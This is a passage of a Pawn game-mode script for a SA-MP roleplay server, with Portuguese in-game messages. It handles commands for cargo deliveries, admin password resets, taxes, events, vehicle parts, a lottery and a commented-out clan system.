						sGivePlayerCash(playerid, 5000);
						Mercadoria[playerid] = 0;
						Mercadoria1[playerid] = 0;
						return 1;
					}
				    else if(pCargo[playerid] > 20 && pCargo[playerid] < 50)
				    {
						SendClientMessage(playerid, 0x66FF66AA, "Você concluiu a entrega e recebeu R$5.000!");
						SendClientMessage(playerid, AZUL_WE, "Você é um(a) transportador(a) nível 2 e recebe +R$500 reais!");
						pCargo[playerid] += 1;
						GameTextForPlayer(playerid, "~n~~n~~b~~h~ENTREGA CONCLUIDA!", 8500, 5);
						PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
						RemovePlayerMapIcon(playerid, 90);
						sGivePlayerCash(playerid, 5500);
						Mercadoria[playerid] = 0;
						Mercadoria1[playerid] = 0;
						return 1;
					}
					return 1;
				}
				else
				{
  					SendClientMessage(playerid, COR_ERRO, "Você não está em um caminhão de transporte.");
		    		return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não é um(a) transportador!");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está no local para entregar os comprovantes!");
		    return 1;
		}
	}

	if(!strcmp(cmd, "/desbugarsenha", true))
	{
		if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, COR_ERRO, "Você não pode usar esse comando.");
		{
			tmp = strtok(cmdtext, idx);
		    if(strlen(tmp) == 0)
		    {
			    return SendClientMessage(playerid, COR_ERRO, "Uso válido: correto /desbugarsenha [Nick]");
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
			if(fexist(gFile))
			{
	     		format(str, sizeof(str), "(SENHA) Você alterou a senha da conta de %s para ' 1234 '", tmp);
	       		SendClientMessage(playerid, 0xBCE635AA, str);
				WE_SetInt(gFile, "Senha", 33030347);
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Essa conta com esse nick não existe!");
				return 1;
			}
		}
	    return 1;
	}
	if(!strcmp(cmd, "/desbugarbanco", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			tmp = strtok(cmdtext, idx);
		    if(strlen(tmp) == 0)
		    {
			    return SendClientMessage(playerid, COR_ERRO, "Uso válido: correto /desbugarbanco [Nick]");
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
			if(fexist(gFile))
			{
	     		format(str, sizeof(str), "(SENHA) Você alterou a senha da conta bancária de %s para ' 1234 '", tmp);
	       		SendClientMessage(playerid, 0xBCE635AA, str);
			    WE_SetInt(gFile, "SenhaBanco", 33030347);
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Essa conta com esse nick não existe!");
				return 1;
			}
		}
	    return 1;
	}
    if(!strcmp(cmd, "/total", true))
    {
		if(aInfo[playerid][Admin] == 1)
		{
		    tmp = strtok(cmdtext, idx);
	    	new
				clima = strval(tmp)
			;
	    	if(!strlen(tmp))
	    	{
			    SendClientMessage(playerid, 0x1E90FFAA, "Uso válido: /total [de?]");
			    return 1;
	    	}
      		new
				rand = -100 + random(1000)
			;
            format(string, sizeof(string), " O total de: %d é %d", clima, clima * 1 / 100 + rand);
            SendClientMessage(playerid, 0xBCE635AA, string);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
	if(!strcmp(cmd, "/dividas", true))
	{
	    if(PlayerToPoint(1.1, playerid, 359.0632,178.6568, 1008.3828) || IsPlayerInDynamicCP(playerid, CP_35))
	    {
		    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		    SendClientMessage(playerid, 0x009966AA, "Dívidas");
			format(gstring, sizeof(gstring), "{1E90FF}{FF1E1E}{1E90FF} Suas dívidas estão acumuladas em: {009966}%d", WE_GetInt(gFile, "Impostos"));
		    SendClientMessage(playerid, COR_BRANCO, gstring);
		    SendClientMessage(playerid, 0x009966AA, "Dívidas");
		    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
			return 1;
		}
		else return SendClientMessage(playerid, COR_ERRO, "Você não está em um local para pagamento de impostos!");
	}
	if(!strcmp(cmd, "/impostosatrasados", true))
	{
	    if(PlayerToPoint(1.1, playerid, 359.0632,178.6568, 1008.3828) || IsPlayerInDynamicCP(playerid, CP_35))
	    {
		    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		    SendClientMessage(playerid, 0xFF0033AA, "Impostos Atrasados ");
			format(gstring, sizeof(gstring), " Seus impostos atrasados: %d de 10", WE_GetInt(gFile, "Atrasados"));
		    SendClientMessage(playerid, COR_BRANCO, gstring);
		    SendClientMessage(playerid, 0xFF0033AA, "Impostos Atrasados ");
		    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
			return 1;
 		}
		else return SendClientMessage(playerid, COR_ERRO, "Você não está na prefeitura!");
	}
	if(!strcmp(cmd, "/pagarimpostos", true))
	{
	    if(PlayerToPoint(1.1, playerid, 359.0632,178.6568, 1008.3828) || IsPlayerInDynamicCP(playerid, CP_35))
	    {
		    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		    if(WE_GetInt(gFile, "Impostos") <= 0)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você não tem dívidas!");
		        return 1;
		    }
		    if(GetPlayerCash(playerid) < WE_GetInt(gFile, "Impostos"))
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para pagar seus impostos!");
		        SendClientFormat(playerid, COR_ERRO, "Sua divida é de: {009966}%d", WE_GetInt(gFile, "Impostos"));
		        return 1;
		    }
		    else if(GetPlayerCash(playerid) >= WE_GetInt(gFile, "Impostos"))
		    {
	            SendClientMessage(playerid, COR_AMARELO, "Seus impostos foram pagos com sucesso!");
	            sGivePlayerCash(playerid, -WE_GetInt(gFile, "Impostos"));
	            PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	            WE_SetInt(gFile, "Impostos", 0);
	            WE_SetInt(gFile, "Atrasados", 0);
	            return 1;
		    }
		}
		else return SendClientMessage(playerid, COR_ERRO, "Você não está na prefeitura!");
	}
	if(strcmp(cmd, "/evento", true) == 0)
	{
		if(aInfo[playerid][Admin] != 1)
		{
			SendClientMessage(playerid, 0xFFFFFFAA, "Você não tem permissão!");
			return 1;
		}
		tmp = strtok(cmdtext, idx);
   		if(!strlen(tmp))
     	{
	    	SendClientMessage(playerid, 0xFFFFFFAA, "Uso válido: /evento [Ape/Veiculo/DM[on/off]/Fechar]");
	    	return 1;
      	}
		else if(strcmp(tmp, "ape", true) == 0)
		{
			if(aInfo[playerid][Admin] != 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			 	return 1;
			}
	 		if(aEventoCriado == true)
			{
			    SendClientMessage(playerid, COR_ERRO, "Já tem um evento criado ! /evento fechar");
				return 1;
			}
			SendClientMessage(playerid, COR_AMARELO, "Evento apé criado com sucesso!");
			GetPlayerPos(playerid, p1, p2, p3);
			GetPlayerFacingAngle(playerid, p4);
			aEventoCriado = true;
			EventoApe = true;
			return 1;
		}
		else if(strcmp(tmp, "veiculo", true) == 0)
		{
			if(aInfo[playerid][Admin] != 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			 	return 1;
			}
	 		if(aEventoCriado == true)
			{
			    SendClientMessage(playerid, COR_ERRO, "Já tem um evento criado ! /evento fechar");
				return 1;
			}
			SendClientMessage(playerid, COR_AMARELO, "Evento com veículo criado com sucesso!");
			GetPlayerPos(playerid, p1, p2, p3);
			GetPlayerFacingAngle(playerid, p4);
			aEventoCriado = true;
			EventoVei = true;
			return 1;
		}
		else if(strcmp(tmp, "dmon", true) == 0)
		{
 			if(aInfo[playerid][Admin] != 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			 	return 1;
			}
			SendClientMessage(playerid, COR_AMARELO, "Death Match Liberado!");
			EventoDM = true;
			return 1;
		}
		else if(strcmp(tmp, "dmoff", true) == 0)
		{
 			if(aInfo[playerid][Admin] != 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			 	return 1;
			}
			SendClientMessage(playerid, COR_AMARELO, "Death Match Fechado!");
			EventoDM = false;
			return 1;
		}
		else if(strcmp(tmp, "fechar", true) == 0)
		{
			if(aInfo[playerid][Admin] != 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			 	return 1;
			}
	 		if(aEventoCriado == false)
			{
			    SendClientMessage(playerid, COR_ERRO, "Não tem nenhum evento criado!");
				return 1;
			}
			SendClientMessage(playerid, COR_AMARELO, "Evento fechado com sucesso!");
			aEventoCriado = false;
			EventoVei = false;
			EventoApe = false;
			return 1;
		}
	}
	if(!strcmp(cmdtext, "/irevento", true))
	{
		if(aEventoCriado == false)
		{
			SendClientMessage(playerid, COR_ERRO, "Não tem nenhum evento criado!");
			return 1;
		}
		new
			veiculo
		;
		veiculo = GetPlayerVehicleID(playerid);
		if(EventoApe == true)
		{
			if(IsPlayerInVehicle(playerid, veiculo))
			{
				SendClientMessage(playerid, COR_ERRO, "O evento em andamento é sem veículo!");
				return 1;
			}
			else
			{
				SetPlayerPos(playerid, p1, p2, p3);
				SetPlayerFacingAngle(playerid, p4);
				return 1;
			}
		}
		if(EventoVei == true)
		{
			if(!IsPlayerInVehicle(playerid, veiculo))
			{
				SendClientMessage(playerid, COR_ERRO, "O evento em andamento é com veículo!");
				return 1;
			}
			else
			{
				SetPlayerNoveiculo(playerid, p1, p2, p3+2, p4, 0);
				return 1;
			}
		}
		return 1;
	}
    if(!strcmp(cmdtext, "/vidaveiculos", true))
    {
  		if(aInfo[playerid][Admin] == 1)
		{
            for(new i = 0; i < MAX_VEHICLES; i++)
            {
           		RepairVehicle(i);
                SetVehicleHealth(i, 1000);
            }
            format(string, sizeof(string), "O(A) administrador(a) %s reparou todos os veículos.", PlayerName(playerid));
            SendClientMessageToAll(0x1E90FFAA, string);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(!strcmp(cmdtext, "/carrocmds", true))
    {
        SendClientMessage(playerid, COR_BRANCO, " [Comandos de Carro] ");
        SendClientMessage(playerid, COR_BRANCO, "/FarolON /FarolOFF /CapoON /CapoOFF /PortamalasON /PortamalasOFF");
        SendClientMessage(playerid, COR_BRANCO, " [Comandos de Carro] ");
		return 1;
    }
    if(!strcmp(cmdtext, "/farolon", true))
    {
        new mot, lu, alar, por, cap, porma, ob;
        new carroa = GetPlayerVehicleID(playerid);
        if(carroa != INVALID_VEHICLE_ID)
		{
   			GetVehicleParamsEx(carroa, mot, lu, alar, por, cap, porma, ob);
       		SetVehicleParamsEx(carroa, mot, VEHICLE_PARAMS_ON, alar, por, cap, porma, ob);
   			SendClientMessage(playerid, COR_AMARELO, "Farol ligado!");
  		}
  		return 1;
    }
	if(!strcmp(cmdtext, "/faroloff", true))
    {
        new mot, lu, alar, por, cap, porma, ob;
        new carroa = GetPlayerVehicleID(playerid);
        if(carroa != INVALID_VEHICLE_ID)
		{
			GetVehicleParamsEx(carroa, mot, lu, alar, por, cap, porma, ob);
    		SetVehicleParamsEx(carroa, mot, VEHICLE_PARAMS_OFF, alar, por, cap, porma, ob);
           	SendClientMessage(playerid, COR_AMARELO, "Farol desligado!");
  		}
  		return 1;
    }
    if(!strcmp(cmdtext, "/capoon", true))
    {
        new mot, lu, alar, por, cap, porma, ob;
        new carroa = GetPlayerVehicleID(playerid);
        if(carroa != INVALID_VEHICLE_ID)
		{
			GetVehicleParamsEx(carroa, mot, lu, alar, por, cap, porma, ob);
 			SetVehicleParamsEx(carroa, mot, lu, alar, por, VEHICLE_PARAMS_ON, porma, ob);
			SendClientMessage(playerid, COR_AMARELO, "Capo aberto!");
  		}
  		return 1;
    }
    if(!strcmp(cmdtext, "/capooff", true))
    {
        new mot, lu, alar, por, cap, porma, ob;
        new carroa = GetPlayerVehicleID(playerid);
        if(carroa != INVALID_VEHICLE_ID)
  		{
		 	GetVehicleParamsEx(carroa, mot, lu, alar, por, cap, porma, ob);
		 	SetVehicleParamsEx(carroa, mot, lu, alar, por, VEHICLE_PARAMS_OFF, porma, ob);
		 	SendClientMessage(playerid, COR_AMARELO, "Capo fechado!");
  		}
  		return 1;
    }
    if(!strcmp(cmdtext, "/portamalason", true))
    {
        new mot, lu, alar, por, cap, porma, ob;
        new carroa = GetPlayerVehicleID(playerid);
        if(carroa != INVALID_VEHICLE_ID)
		{
      		GetVehicleParamsEx(carroa, mot, lu, alar, por, cap, porma, ob);
         	SetVehicleParamsEx(carroa, mot, lu, alar, por, cap, VEHICLE_PARAMS_ON, ob);
     		SendClientMessage(playerid, COR_AMARELO, "Portamalas aberto!");
  		}
  		return 1;
    }
    if(!strcmp(cmdtext, "/portamalasoff", true))
    {
        new mot, lu, alar, por, cap, porma, ob;
        new carroa = GetPlayerVehicleID(playerid);
        if(carroa != INVALID_VEHICLE_ID)
        {
       		GetVehicleParamsEx(carroa, mot, lu, alar, por, cap, porma, ob);
           	SetVehicleParamsEx(carroa, mot, lu, alar, por, cap, VEHICLE_PARAMS_OFF, ob);
   			SendClientMessage(playerid, COR_AMARELO, "Portamalas fechado!");
  		}
  		return 1;
    }
    if(!strcmp(cmd, "/apostar", true))
    {
        if(PlayerToPoint(1.1, playerid, -2159.0813, 640.3607, 1052.3817))
        {
	  		tmp = strtok(cmdtext, idx);
			if(strlen(tmp) == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido:  /Apostar [Número]");
				return 1;
			}
			new
				aposta = strval(tmp)
			;
			if(WE_GetInt("Loteria.ini", PlayerName(playerid)) == 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você já fez sua aposta hoje!");
			    return 1;
			}
			if(GetPlayerCash(playerid) < 500)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você precisa ter R$500 em mãos para poder apostar!");
			    return 1;
			}
			if(aposta < 0 || aposta > 60)
			{
			    SendClientMessage(playerid, COR_ERRO, "O número da aposta somente entre os números 0 á 60!");
				return 1;
			}
			if(WE_GetInt("Loteria.ini", tmp) != 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Esse número já foi escolhido, por favor escolha outro!");
				return 1;
			}
		    WE_SetString("Loteria.ini", tmp, PlayerName(playerid));
		    WE_SetString("Loteria.ini", PlayerName(playerid), "1");
		    sGivePlayerCash(playerid, -500);
	  		format(gStr, sizeof(gStr), "(LOTERIA) Você apostou no número %d, boa sorte!", aposta);
   			SendClientMessage(playerid, 0x009933AA, gStr);
	        return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em uma casa lotérica!");
		    return 1;
		}
    }
    if(!strcmp(cmd, "/acumulados", true))
    {
        if(PlayerToPoint(1.1, playerid, -2159.0813, 640.3607, 1052.3817))
        {
			if(WE_GetInt("Acumulado.ini", "Acumulado") <= 0)
			{
			    SendClientMessage(playerid, 0x009933AA, "(LOTERIA) Não à nenhum sorteio acumulado!");
			    return 1;
			}
			else
			{
			    SendClientFormat(playerid, 0x009933AA, "(LOTERIA) A loteria está acumulada somando um total de R$%d", WE_GetInt("Acumulado.ini", "Acumulado"));
	        	return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em uma casa lotérica!");
		    return 1;
		}
    }
    if(!strcmp(cmd, "/sorteio", true))
    {
        if(aInfo[playerid][Admin] == 1)
        {
	        SortearLoteria();
	        SendClientMessage(playerid, -1, "Soterio realizado com sucesso!");
		}
		return 1;
	}
	/*if(!strcmp(cmd, "/criarcla", true))
	{
		if(in_z[playerid] != -1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode utilizar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
	    if(LiberadoGG[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você precisa da permissão de um membro da staff para criar um clã!");
	        SendClientMessage(playerid, COR_ERRO, "É necessário ter também R$10.000 em mãos.");
	        return 1;
		}
		if(GetPlayerCash(playerid) < 10000)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você precisa de R$10.000 para poder criar um clã!");
		    return 1;
		}
		if(strcmp(playerClan[playerid], " ", false))
  		{
  		    format(gStr, 128, "Você já percente ao clã %s!", playerClan[playerid]);
  		    SendClientMessage(playerid, COR_ERRO, gStr);
  		    return 1;
  		}
		new
			length = strlen(cmdtext)
		;
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
	     	idx++;
		}
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
	   		idx++;
		}
	 	result[idx - offset] = EOS;

	 	if(!strlen(result))
		{
	      	SendClientMessage(playerid, COR_ERRO, "Uso válido: /CriarCla [Nome do seu clã]");
	      	return 1;
	  	}
 	 	if(strlen(result) > 24)
		{
	      	SendClientMessage(playerid, COR_ERRO, "O máximo de caracteres permitido é de 24!");
	      	return 1;
	  	}
	  	format(gFile, sizeof(gFile), "clans/%s.ini", result);
		if(!fexist(gFile))
		{
			WE_CreateFile(gFile);
			WE_SetString(gFile, "Dono", PlayerName(playerid));
			WE_SetInt(gFile, "Color", -1);
			new
			    m_id[24]
			;
			for(new m = 1; m < 31; ++m)
			{
			    format(m_id, 24, "Membro%d", m);
			    WE_SetString(gFile, m_id, "Ninguem");
			}
		}
		else
		{
		    format(gStr, 128, "Já existe um clã chamado %s!", result);
			SendClientMessage(playerid, COR_ERRO, gStr);
			SendClientMessage(playerid, COR_ERRO, "Defina outro nome para seu clã.");
			return 1;
		}
		format(pFile, 128, "clans/%s.ini", PlayerName(playerid));
  	  	if(fexist(pFile))
	  	{
	  	    fremove(pFile);
			WE_CreateFile(pFile);
	  	    WE_SetString(pFile, "cla", result);
	  	}
	  	else
	  	{
			WE_CreateFile(pFile);
	  	    WE_SetString(pFile, "cla", result);
	  	}
	  	format(playerClan[playerid], MAX_PLAYER_NAME+1, result);
	  	clanColor[playerid] = -1;

		format(gStr, sizeof(gStr), "Clã '{FFFFFF}%s{1E90FF}' criado.", result);
		SendClientMessage(playerid, AZUL_WE, gStr);
        sGivePlayerCash(playerid, -10000);
		format(gstring, sizeof(gstring), "%s criou o clã '{FFFFFF}%s{1E90FF}'", PlayerName(playerid), result);
		SendClientMessageToAll(AZUL_WE, gstring);
	  	return 1;
	}
	if(!strcmp(cmd, "/excluircla", true))
	{
		if(in_z[playerid] != -1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode utilizar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
		if(!strcmp(playerClan[playerid], " ", true))
  		{
  		    SendClientMessage(playerid, COR_ERRO, "Você não percente a nenhum clã!");
  		    return 1;
  		}
		format(gFile, sizeof(gFile), "clans/%s.ini", playerClan[playerid]);
		if(strcmp(WE_GetString(gFile, "Dono"), PlayerName(playerid), false))
		{
  			format(gstring, sizeof(gstring), "Você não é dono(a) do Clã %s, somente o(a) dono(a) pode exclui-lo(a)!", playerClan[playerid]);
	    	SendClientMessage(playerid, COR_ERRO, gstring);
	    	return 1;
		}
		new
			m_id[24],
			n_m[128]
		;
		for(new m = 1; m < 31; ++m)
		{
		    format(m_id, 24, "Membro%d", m);

	    	if(strcmp(WE_GetString(gFile, m_id), "Ninguem", false))
	    	{
	    	    format(n_m, 128, "clans/%s.ini", WE_GetString(gFile, m_id));
	    	    if(fexist(n_m))
				{
					fremove(n_m);
				}
	    	}
	    }
		format(gStr, sizeof(gStr), "Clã '{FFFFFF}%s{FF1E1E}' excluído.", playerClan[playerid]);
		SendClientMessage(playerid, VERMELHO_WE, gStr);
		format(gstring, sizeof(gstring), "{FFFFFF}%s {FF1E1E}excluiu o clã '{FFFFFF}%s{FF1E1E}'", PlayerName(playerid), playerClan[playerid]);
		SendClientMessageToAll(VERMELHO_WE, gstring);
		foreach(Player, c)
		{
		    if(c != playerid && !strcmp(playerClan[c], playerClan[playerid], true))
		    {
		    	format(playerClan[c], MAX_PLAYER_NAME+1, " ");
	  			clanColor[c] = -1;

				format(gstring, sizeof(gstring), "{FFFFFF}%s {FF1E1E}excluiu o clã '{FFFFFF}%s{FF1E1E}', no qual você fazia parte.", PlayerName(playerid), playerClan[playerid]);
				SendClientMessage(c, VERMELHO_WE, gstring);
			}
		}
		format(playerClan[playerid], MAX_PLAYER_NAME+1, " ");
		clanColor[playerid] = -1;
		fremove(gFile);
		format(gStr, 128, "clans/%s.ini", PlayerName(playerid));
  		fremove(gStr);
	    return 1;
	}
    if(!strcmp(cmd, "/convidarcla", true))
    {
		if(in_z[playerid] != -1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode utilizar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
		if(!strcmp(playerClan[playerid], " ", true))
  		{
  		    SendClientMessage(playerid, COR_ERRO, "Você não percente a nenhum clã!");
  		    return 1;
  		}
		format(gFile, sizeof(gFile), "clans/%s.ini", playerClan[playerid]);
		if(strcmp(WE_GetString(gFile, "Dono"), PlayerName(playerid), false))
		{
  			format(gstring, sizeof(gstring), "Você não é dono(a) do clã '%s'", playerClan[playerid]);
	    	SendClientMessage(playerid, COR_ERRO, gstring);
	    	return 1;
		}
  		if(strcmp(WE_GetString(gFile, "Membro1"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro2"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro3"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro4"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro5"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro6"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro7"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro8"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro9"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro10"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro11"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro12"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro13"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro14"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro15"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro16"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro17"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro18"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro19"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro20"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro21"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro22"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro23"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro24"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro25"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro26"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro27"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro28"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro29"), "Ninguem", false) &&
		strcmp(WE_GetString(gFile, "Membro30"), "Ninguem", false))
		{
			format(gStr, 128, "Seu clã '%s' já excedeu o limite de 30 membros!", playerClan[playerid]);
			SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
  			SendClientMessage(playerid, COR_ERRO, "Uso válido: /ConvidarCla [ID]");
		  	return 1;
		}
		new
			id = strval(tmp)
		;
  		if(!IsPlayerConnected(id))
    	{
    		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
			return 1;
		}
		if(GetDistanceBetweenPlayers(playerid, id) > 20) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe para convidá-lo(a)!");

 		if(!strcmp(playerClan[id], playerClan[playerid], true))
		{
			format(gStr, sizeof(gStr), "%s já é membro do seu clã.", PlayerName(id));
 			SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}
		if(strcmp(playerClan[id], " ", false))
		{
			format(gStr, sizeof(gStr), "%s já é membro do clã %s.", PlayerName(id), playerClan[id]);
 			SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}
		format(gstring, sizeof(gstring), "Você está convidando '{FFFFFF}%s{1E90FF}' para participar do seu clã '{FFFFFF}%s{1E90FF}'", PlayerName(id), playerClan[playerid]);
		SendClientMessage(playerid, AZUL_WE, gstring);
		format(gstring, sizeof(gstring), "'{FFFFFF}%s{1E90FF}' está convidando você para participar do clã '{FFFFFF}%s{1E90FF}'", PlayerName(playerid), playerClan[playerid]);
		SendClientMessage(id, AZUL_WE, gstring);
		timercou[id] = SetTimerEx("MesagemClaConvite", 4000, false, "d", id);
		convidou[id] = playerid;
		msgconvi[id] = 1;
        return 1;
    }
    if(!strcmp(cmd, "/saircla", true))
    {
		if(in_z[playerid] != -1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode utilizar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
		if(!strcmp(playerClan[playerid], " ", true))
  		{
  		    SendClientMessage(playerid, COR_ERRO, "Você não percente a nenhum clã!");
  		    return 1;
  		}
		format(gFile, sizeof(gFile), "clans/%s.ini", playerClan[playerid]);
		if(!strcmp(WE_GetString(gFile, "Dono"), PlayerName(playerid), true))
		{
  			format(gstring, sizeof(gstring), "Você é dono(a) do clã '%s', portando não pode sair!", playerClan[playerid]);
	    	SendClientMessage(playerid, COR_ERRO, gstring);
	    	SendClientMessage(playerid, COR_ERRO, "Para sair você deve excluí-lo!");
	    	return 1;
		}
		new
			m_id[24]
		;
		for(new m = 1; m < 31; ++m)
		{
		    format(m_id, 24, "Membro%d", m);

	    	if(!strcmp(WE_GetString(gFile, m_id), PlayerName(playerid), true))
	    	{
	    	    WE_SetString(gFile, m_id, "Ninguem");
	    	}
	    }
        format(gStr, sizeof(gStr), "Você revogou sua vaga como membro do clã {FFFFFF}%s", playerClan[playerid]);
		SendClientMessage(playerid, AZUL_WE, gStr);
		format(gStr, sizeof(gStr), "Você não pertence mais ao clã {FFFFFF}%s", playerClan[playerid]);
		SendClientMessage(playerid, AZUL_WE, gStr);
		foreach(Player, c)
		{
		    if(c != playerid && !strcmp(playerClan[c], playerClan[playerid], true))
		    {
		  		format(gStr, 128, "~w~%s~n~~r~~h~saiu do cla", PlayerName(playerid));
				GameTextForPlayer(c, gStr, 5000, 15);
				format(gstring, sizeof(gstring), "%s não é mais membro do seu clã.", PlayerName(playerid));
				SendClientMessage(c, COR_ERRO, gstring);
			}
		}
		format(playerClan[playerid], MAX_PLAYER_NAME+1, " ");
		clanColor[playerid] = -1;
		format(gStr, 128, "clans/%s.ini", PlayerName(playerid));
  		fremove(gStr);
        return 1;
    }
	if(!strcmp(cmd, "/expulsarcla", true))
	{
		if(in_z[playerid] != -1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode utilizar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
		if(!strcmp(playerClan[playerid], " ", true))
  		{
  		    SendClientMessage(playerid, COR_ERRO, "Você não percente a nenhum clã!");
  		    return 1;
  		}

		format(gFile, sizeof(gFile), "clans/%s.ini", playerClan[playerid]);

		if(strcmp(WE_GetString(gFile, "Dono"), PlayerName(playerid), false))
		{
  			format(gstring, sizeof(gstring), "Você não é dono(a) do clã %s, somente o(a) dono(a) pode expulsar!", playerClan[playerid]);
	    	SendClientMessage(playerid, COR_ERRO, gstring);
	    	return 1;
		}
		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /ExpulsarCla [Membro ID]");
			return 1;
		}
		new
			Membron = strval(tmp)
		;
		if(Membron < 1 || Membron > 30)
		{
			SendClientMessage(playerid, COR_ERRO, "Somente membros ID de 1 à 30!");
			return 1;
		}
		format(gStr, sizeof(gStr), "Membro%d", Membron);

		if(!strcmp(WE_GetString(gFile, gStr), "Ninguem", true))
		{
			SendClientMessage(playerid, COR_ERRO, "Não há nenhum membro nessa vaga!");
			return 1;
		}

		new
		    ex_do_cla[24]
		;
		format(ex_do_cla, 24, WE_GetString(gFile, gStr));

		WE_SetString(gFile, gStr, "Ninguem");

		format(gstring, sizeof(gstring), "Você expulsou %s do seu(sua) Clã {FFFFFF}%s", ex_do_cla, playerClan[playerid]);
		SendClientMessage(playerid, COR_AMARELO, gstring);

		foreach(Player, c)
		{
		    if(c != playerid && !strcmp(playerClan[c], playerClan[playerid], false))
		    {
		  		format(gStr, 128, "~w~%s ~r~~h~foi expulso do cla", ex_do_cla);
				GameTextForPlayer(c, gStr, 5000, 15);

				format(gstring, sizeof(gstring), "{FFFFFF}%s {FF1E1E}líder do seu clã, expulsou {FFFFFF}%s.", PlayerName(playerid), ex_do_cla);
				SendClientMessage(c, VERMELHO_WE, gstring);

				if(!strcmp(PlayerName(c), ex_do_cla, false))
	            {
					format(playerClan[c], MAX_PLAYER_NAME+1, " ");
		  			clanColor[c] = -1;
	            }
			}
		}
  		new
  		    n_m[128]
  		;
		format(n_m, 128, "clans/%s.ini", ex_do_cla);

		if(fexist(n_m))
		{
			fremove(n_m);
		}
		return 1;
	}
    if(!strcmp(cmd, "/corcla", true))
    {
		if(in_z[playerid] != -1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você só pode utilizar comandos de clã fora das Gangue Zones!");
		    return 1;
		}
		if(!strcmp(playerClan[playerid], " ", true))
  		{
  		    SendClientMessage(playerid, COR_ERRO, "Você não percente a nenhum clã!");
  		    return 1;
  		}
